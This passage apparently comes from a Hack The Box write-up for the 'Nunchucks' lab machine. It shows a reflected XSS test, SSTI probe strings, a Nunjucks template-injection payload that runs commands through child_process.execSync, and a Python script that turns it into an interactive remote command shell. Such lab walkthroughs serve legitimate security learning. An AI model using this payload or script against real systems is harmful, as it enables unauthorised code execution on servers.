+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">      <span class="z-keyword z-control z-flow z-ts">return</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">resp</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">json</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">    <span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-meta z-brace z-round z-ts">)</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-promise z-ts">then</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-arrow z-ts"><span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-variable z-parameter z-ts">data</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> </span><span class="z-meta z-arrow z-ts"><span class="z-storage z-type z-function z-arrow z-ts">=&gt;</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">      <span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">getElementById</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>output<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-property z-ts">innerHTML</span> <span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-variable z-other z-object z-ts">data</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-property z-ts">response</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">    <span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></code></pre>
+<p>So this JavsScript file is responsible for sending the content of the form upon submittion. It reads the response, and changes the inner HTML of the element whose id is <code>output</code> to the response data.</p>
+<p>The <code>innerHTML</code> is a dangerous function, so we might be able to alter the HTML of the element whose id is <code>output</code>!</p>
+<h3 id="xss">XSS</h3>
+<p>Since the form field is supposed to be an email, our browser prevents us from entering what we want. We can easily bypass this frontend verification using <a href="https://caido.io/">Caido</a>.</p>
+<p>I'll replay the last request we sent, and directly modify the <code>email</code> JSON parameter value. Let's set it to <code>&lt;script&gt;alert(\&quot;XSS\&quot;)&lt;/script&gt;</code> (I escaped the double quotes to prevent errors) and look at the response.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/caido-subdomain-newsletter-request-xss-test.png" alt="Using Caido to replay subdomain newsletter request with XSS payload" /></p>
+<p>It looks like it worked! There's no kind of validation in place, so our input is rendered and reflected in the response. We have a reflected XSS here! But it's really useless, it would only be impactful if someone entered himself the XSS payload, or if we used HTTP request smuggling... Anyways, we won't get a foothold this way.</p>
+<h3 id="ssti">SSTI</h3>
+<p>Since our input is rendered and reflected in the response, maybe it's vulnerable to SSTI. Let's check for it by entering the following payloads:</p>
+<pre class="z-code"><code><span class="z-text z-plain">{{7*7}}, ${7*7}, &lt;%= 7*7 %&gt;, ${{7*7}}, #{7*7}, *{7*7}
+</span></code></pre>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/caido-subdomain-newsletter-request-ssti-test.png" alt="Using Caido to replay subdomain newsletter request with SSTI payload" /></p>
+<p>Alright, so the first payload we entered has been computed to <code>49</code>! The fourth too, but there's a leading <code>$</code> before it, so the first one is what has been computed really.</p>
+<p>This means that we can execute code on the server side!</p>
+<h1 id="foothold-ssti">Foothold (SSTI)</h1>
+<p>We know that Nunchucks is using the Express framework, but we don't know which template engine it's using.</p>
+<p>If we search online for it, we see that Express actually supports <a href="https://expressjs.com/en/resources/template-engines.html">a lot of them</a>!</p>
+<p>Fortunately, one of them is named <code>Nunjucks</code>... considering it's also the name of the box, it's safe to assume that this is the template engine used by the web server!</p>
+<h2 id="getting-rce">Getting RCE</h2>
+<p>If we search online for SSTI payloads affecting the Nunjucks template engine, we find one on <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks">HackTricks</a>. We should be able to execute a command with this payload:</p>
+<pre data-lang="js" class="language-js z-code"><code class="language-js" data-lang="js"><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span><span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">range</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">constructor</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;&lt;COMMAND&gt;&#39;)<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-definition z-block z-ts">}</span></span><span class="z-punctuation z-definition z-block z-ts">}</span></span>
+</span></code></pre>
+<p>Okay, so we know how to execute commands on the target server.</p>
+<h2 id="script">Script</h2>
+<p>It's really not practical to abuse this RCE using Caido, so I'll use this Python script:</p>
+<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">requests</span></span></span>
+</span><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">cmd</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-meta z-generic-name z-python">Cmd</span></span>
+</span><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">warnings</span></span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Disable SSL/TLS warnings related to insecure requests
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">requests</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">packages</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">urllib3</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">disable_warnings</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span>
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">requests</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">packages</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">urllib3</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">exceptions</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">InsecureRequestWarning</span></span>
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define a custom command-line interpreter class
+</span></span><span class="z-source z-python"><span class="z-meta z-class z-python"><span class="z-storage z-type z-class z-python"><span class="z-keyword z-declaration z-class z-python">class</span></span> <span class="z-entity z-name z-class z-python"><span class="z-meta z-generic-name z-python">MyCmd</span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-punctuation z-section z-inheritance z-begin z-python">(</span></span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-entity z-other z-inherited-class z-python">Cmd</span><span class="z-punctuation z-section z-inheritance z-end z-python">)</span></span><span class="z-meta z-class z-python"><span class="z-punctuation z-section z-class z-begin z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Set the prompt for the command-line interface
+</span></span><span class="z-source z-python">    <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">prompt</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">&gt; <span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define the default behavior for handling input
+</span></span><span class="z-source z-python"><span class="z-meta z-function z-python">    <span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">default</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-variable z-parameter z-python">self</span><span class="z-punctuation z-separator z-parameters z-python">,</span> <span class="z-variable z-parameter z-python">line</span><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define the target URL
+</span></span><span class="z-source z-python">        <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">url</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">https://store.nunchucks.htb/api/submit<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Create a dictionary containing the payload for command injection
+</span></span><span class="z-source z-python">        <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">data</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-mapping-or-set z-python"><span class="z-punctuation z-section z-mapping-or-set z-begin z-python">{</span>
+</span></span><span class="z-source z-python"><span class="z-meta z-mapping-or-set z-python"></span><span class="z-meta z-mapping z-python">            </span><span class="z-meta z-mapping z-key z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">email<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span></span><span class="z-meta z-mapping z-python"><span class="z-punctuation z-separator z-mapping z-key-value z-python">:</span></span><span class="z-meta z-mapping z-python"> </span><span class="z-meta z-mapping z-value z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-python">{{</span>range.constructor(<span class="z-constant z-character z-escape z-python">\&quot;</span>return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span></span><span class="z-source z-python"><span class="z-meta z-mapping z-value z-python">            <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">line</span></span>
+</span></span><span class="z-source z-python"><span class="z-meta z-mapping z-value z-python">            <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">&#39;)<span class="z-constant z-character z-escape z-python">\&quot;</span>)()<span class="z-constant z-character z-escape z-python">}}</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span></span><span class="z-source z-python"><span class="z-meta z-mapping z-value z-python"></span><span class="z-meta z-mapping z-python">        <span class="z-punctuation z-section z-mapping z-end z-python">}</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">        <span class="z-meta z-statement z-exception z-try z-python"><span class="z-keyword z-control z-exception z-try z-python">try</span><span class="z-punctuation z-section z-block z-exception z-try z-python">:</span></span>
+</span><span class="z-source z-python">            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Send a POST request with the payload to the target URL, disabling SSL/TLS verification
+</span></span><span class="z-source z-python">            <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">response</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">requests</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">post</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">url</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">data</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">data</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">verify</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-constant z-language z-python">False</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">            <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">json_response</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">response</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">json</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">            <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">response_text</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">json_response</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">get</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">response<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Find the index of the &quot;address:&quot; string in the response, which is just before the payload result
+</span></span><span class="z-source z-python">            <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">address_index</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">response_text</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">find</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">address:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">            <span class="z-meta z-statement z-conditional z-if z-python"><span class="z-keyword z-control z-conditional z-if z-python">if</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">address_index</span></span> <span class="z-keyword z-operator z-comparison z-python">!=</span> <span class="z-keyword z-operator z-arithmetic z-python">-</span><span class="z-constant z-numeric z-integer z-decimal z-python">1</span><span class="z-punctuation z-section z-block z-conditional z-if z-python">:</span></span>
+</span><span class="z-source z-python">                <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Extract and print our payload result from the response
+</span></span><span class="z-source z-python">                <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">address_text</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-item-access z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">response_text</span></span></span><span class="z-meta z-item-access z-python"><span class="z-punctuation z-section z-brackets z-begin z-python">[</span></span><span class="z-meta z-item-access z-arguments z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">address_index</span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">len</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">address:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span> <span class="z-punctuation z-separator z-slice z-python">:</span></span><span class="z-meta z-item-access z-python"><span class="z-punctuation z-section z-brackets z-end z-python">]</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">strip</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">                <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">address_text</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">address_text</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">rstrip</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">.<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">rstrip</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-python">\n</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">                <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Check if our payload returned something
+</span></span><span class="z-source z-python">                <span class="z-meta z-statement z-conditional z-if z-python"><span class="z-keyword z-control z-conditional z-if z-python">if</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">address_text</span></span> <span class="z-keyword z-operator z-comparison z-python">!=</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-block z-conditional z-if z-python">:</span></span>
+</span><span class="z-source z-python">                    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">print</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">address_text</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">        <span class="z-meta z-statement z-exception z-catch z-python"><span class="z-keyword z-control z-exception z-catch z-python">except</span> <span class="z-support z-type z-exception z-python">Exception</span> <span class="z-keyword z-control z-exception z-catch z-as z-python">as</span></span><span class="z-meta z-statement z-exception z-catch z-python"> <span class="z-meta z-generic-name z-python">e</span></span><span class="z-meta z-statement z-exception z-catch z-python"><span class="z-punctuation z-section z-block z-exception z-catch z-python">:</span></span>
+</span><span class="z-source z-python">            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Ignore any exceptions that may occur during the request or response handling
+</span></span><span class="z-source z-python">            <span class="z-keyword z-control z-flow z-pass z-python">pass</span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define behavior for an empty line (do nothing)
+</span></span><span class="z-source z-python"><span class="z-meta z-function z-python">    <span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">emptyline</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-variable z-parameter z-python">self</span><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-keyword z-control z-flow z-pass z-python">pass</span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define behavior for the &#39;exit&#39; command
+</span></span><span class="z-source z-python"><span class="z-meta z-function z-python">    <span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">do_exit</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-variable z-parameter z-python">self</span><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Return True to exit the command loop
+</span></span><span class="z-source z-python">        <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-constant z-language z-python">True</span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Entry point of the script
+</span></span><span class="z-source z-python"><span class="z-meta z-statement z-conditional z-if z-python"><span class="z-keyword z-control z-conditional z-if z-python">if</span> <span class="z-meta z-qualified-name z-python"><span class="z-support z-variable z-magic z-python">__name__</span></span> <span class="z-keyword z-operator z-comparison z-python">==</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">__main__<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-block z-conditional z-if z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Create an instance of the custom command-line interpreter and start the command loop
+</span></span><span class="z-source z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">MyCmd</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">cmdloop</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span></code></pre>
+<p>I'll save it as <code>ssti.py</code>.</p>
+<p>Now it should be much more easier to exploit the RCE!</p>
+<h2 id="ssh-port-22-tcp">SSH (port <code>22/tcp</code>)</h2>
+<p>We noticed in the initial <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#tcp-port-scanning">TCP port scanning</a> that Nunchucks was accepting connections over SSH, so it would be interesting to use this to get a real shell.</p>
+<p>Let's run <code>whoami</code> to see who we are:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> whoami
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">david
+</span></code></pre>
+<p>Luckily, if we check <code>/home</code>, we see that <code>david</code> has a home folder.</p>
